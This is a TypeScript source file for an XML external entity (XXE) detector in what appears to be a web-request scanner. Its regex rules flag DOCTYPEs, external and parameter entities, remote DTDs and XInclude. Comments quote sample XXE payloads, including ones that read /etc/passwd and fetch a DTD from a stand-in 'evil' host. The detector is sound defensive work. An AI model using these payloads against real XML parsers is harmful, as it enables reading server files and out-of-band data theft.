import { NormalizedRequest } from '@tessera/shared/contracts';
import { Tool, ToolCategory, ToolContextType, ToolResult, clip, metadataOf, safe, suspicious } from '@tessera/core/static-analysis/shared';

interface XxeRule {
    name: string;
    pattern: RegExp;
}

const MAX_LENGTH = 65_536;

// No g flags, so RegExp.test has no lastIndex state on these shared constants.
const RULES: XxeRule[] = [
    {
        name: 'doctype_declaration',
        pattern: /<!DOCTYPE\b/i,
    },
    {
        // <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!ENTITY % remote SYSTEM "http://evil/x.dtd">
        name: 'external_entity',
        pattern: /<!ENTITY\s+(?:%\s*)?[\w.-]+\s+(?:SYSTEM|PUBLIC)\b/i,
    },
    {
        // parameter entities are how blind/out-of-band XXE pulls in a remote DTD
        name: 'parameter_entity',
        pattern: /<!ENTITY\s+%\s*[\w.-]+|%[\w.-]+;/i,
    },
    {
        // <!DOCTYPE foo SYSTEM "http://evil/x.dtd">   <!DOCTYPE x PUBLIC "-//x" "http://...">
        name: 'external_dtd',
        pattern: /<!DOCTYPE\s+[\w:.-]+\s+(?:SYSTEM|PUBLIC)\b/i,
    },
    {
        // file:, php://filter, expect://, jar:, netdoc:, gopher: inside an entity or DTD reference
        name: 'dangerous_entity_uri',
        pattern: /(?:SYSTEM|PUBLIC)\s+(?:"[^"]*"\s+)?["'](?:file:|php:\/\/|expect:\/\/|jar:|netdoc:|gopher:|ftp:|data:)/i,
    },
    {
        // <xi:include href="file:///etc/passwd"/>   (XInclude, works even without a DOCTYPE)
        name: 'xinclude',
        pattern: /<\w*:?include\b[^>]*\bhref\s*=|xmlns(?::\w+)?\s*=\s*["']http:\/\/www\.w3\.org\/2001\/XInclude["']/i,
    },
];

export default class Xxe extends Tool<ToolContextType.Full> {
    constructor() {
        super({
            id: 'xxe',
            displayName: 'XML external entity (XXE)',
            category: ToolCategory.Injection,
            contextType: ToolContextType.Full,
        });
    }

    override run(context: NormalizedRequest): ToolResult {
        const findings: { source: string; rules: string[] }[] = [];

        for (const { source, text } of Xxe.xmlSources(context)) {
            const rules = RULES.filter(rule => rule.pattern.test(text)).map(rule => rule.name);
            if (rules.length > 0) findings.push({ source, rules });
        }

        return findings.length > 0 ? suspicious(this.tool, { findings: findings.slice(0, 5) }) : safe(this.tool);
    }

    // The body (raw or unparsed) and any field that carries XML, e.g. an XML document inside a JSON property.
    static xmlSources(request: NormalizedRequest): { source: string; text: string }[] {
        const sources: { source: string; text: string }[] = [];
        const raw = metadataOf(request).rawBody ?? (typeof request.body === 'string' ? request.body : undefined);
        if (typeof raw === 'string' && raw.includes('<')) {
            sources.push({ source: 'body', text: raw.slice(0, MAX_LENGTH) });
        }
        for (const field of request.fields) {
            if (typeof field.value === 'string' && /<[!?]?[A-Za-z]/.test(field.value)) {
                sources.push({ source: `${field.location}:${clip(field.name, 50)}`, text: field.value.slice(0, MAX_LENGTH) });
            }
        }
        return sources;
    }
}
